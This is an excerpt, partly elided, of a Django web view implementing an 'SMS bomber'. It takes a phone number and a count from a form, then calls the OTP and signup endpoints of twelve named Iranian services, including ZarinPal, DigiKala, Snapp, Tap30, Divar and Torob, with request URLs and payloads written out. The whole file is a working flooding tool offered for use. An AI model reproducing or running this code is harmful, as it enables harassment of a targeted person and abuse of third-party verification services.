...
def show(request):
    return render(request, "bomber/index.html")


def bomber(request):
    phonee = request.POST.get('text')
    rangess = request.POST.get('password')
    ...
    class SMSBomber:
        def __init__(self, ranges, phone):
            ...
            try:
                ...
                print(
                    "\033[31;1mInvalid Argument\033[0;m Please Try Again \033[33;1m!!!")
                time.sleep(3)
                os._exit(0)
            else:
            ...
            try:
                ...
                try:
                    ...
                    try:
                        ...
                        print(
                            f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mNaraft To Matehatesh :(")
                    else:
                        if res.status_code == 200:
                            now_time = datetime.datetime.now().strftime("%H : %M : %S")
                            print(
                                f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mRaft To Matehatesh :)")
                        else:
                            now_time = datetime.datetime.now().strftime("%H : %M : %S")
                            print(
                                f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mNaraft To Matehatesh :(")
        ...
        def __ZarinPal__(self):
            ...
            ZarinData = {"first_name": "محمدی",
                         "last_name": "حمیدی", "cell_number": zarin_phone}
            "https://next.zarinpal.com/api/oauth/register"

            self.__Requester__(URL="https://next.zarinpal.com/api/oauth/register",
                               HD=ZarinHeader, DT=ZarinData, MD="ZarinPal")
        ...
        def __DigiKala__(self):
            ...
            self.__Requester__(URL="https://sirius.digikala.com/v1/user/authentication/",
                               HD=DigiKalaHeader, DT=digi_data, MD="DigiKala")
        ...
        def __Esam__(self):
            ...
            esam_data = {"mobile": esam_phone, "present_type": "AndroidApp",
                         "registration_method": 1, "serialNumber": "5e40e4fd2985e2cf"}
            self.__Requester__(URL="https://api.esam.ir/api/account/RegisterOrLogin",
                               HD=EsamHeader, DT=esam_data, MD="Esam")
        ...
        def __Ewano__(self):
            ...
            self.__Requester__(URL="https://api-ebcom.mci.ir/services/auth/v1.0/otp",
                               HD=EwanoHeader, DT=ewano_data, MD="Ewano")
        ...
        def __Ghabzinoo__(self):
            ...
            ghabzinoo_data = {"Parameters": {"ApplicationType": "Android", "ApplicationUniqueToken": "playstore",
                                             "ApplicationVersion": "1.3.0", "MobileNumber": ghabzinoo_phone}}

            self.__Requester__(URL="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/RequestActivationCode",
                               HD=GhabzinooHeader, DT=ghabzinoo_data, MD="Ghabzinoo")
        ...
        def __Sheypoor__(self):
            ...
            self.__Requester__(URL="https://www.sheypoor.com/api/v6.4.2/auth/state-request",
                               HD=SheypoorHeader, DT=sheypoor_data, MD="Sheypoor")
        ...
        def __SnapFood__(self):
            ...
            self.__Requester__(URL="https://newapi.zoodfood.com/mobile/v2/user/loginMobileWithNoPass",
                               HD=SnapFoodHeader, DT=snapfood_data, MD="SnapFood", MO="data")
        ...
        def __Snap__(self):
            ...
            self.__Requester__(URL="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                               HD=SnapHeader, DT=snap_data, MD="Snap")
        ...
        def __Igap__(self):
            ...
            self.__Requester__(
                URL=f"https://core.gap.im/v1/user/add.json?mobile=%2B{igap_phone}", HD=IgapHeader, DT="", MD="Igap", MO="get")
        ...
        def __Tap30__(self):
            ...
            tap30_data = {"credential": {
                "phoneNumber": tap30_phone, "role": "PASSENGER"}}

            self.__Requester__(URL="https://tap33.me/api/v2/user",
                               HD=Tap30Header, DT=tap30_data, MD="Tap30")
        ...
        def __Divar__(self):
            ...
            self.__Requester__(URL="https://api.divar.ir/v5/auth/authenticate",
                               HD=DivarHeader, DT=divar_data, MD="Divar")
        ...
        def __Torob__(self):
            ...
            self.__Requester__(
                URL=f"https://api.torob.com/a/phone/send-pin/?phone_number={torob_phone}", HD=TorobHeader, DT="", MD="Torob", MO="get")

        def Bomber(self):
            list_sms_sender = ["ZarinPal", "DigiKala", "Esam", "Ewano", "Ghabzinoo",
                               "Sheypoor", "SnapFood", "Snap", "Igap", "Tap30", "Divar", "Torob"]
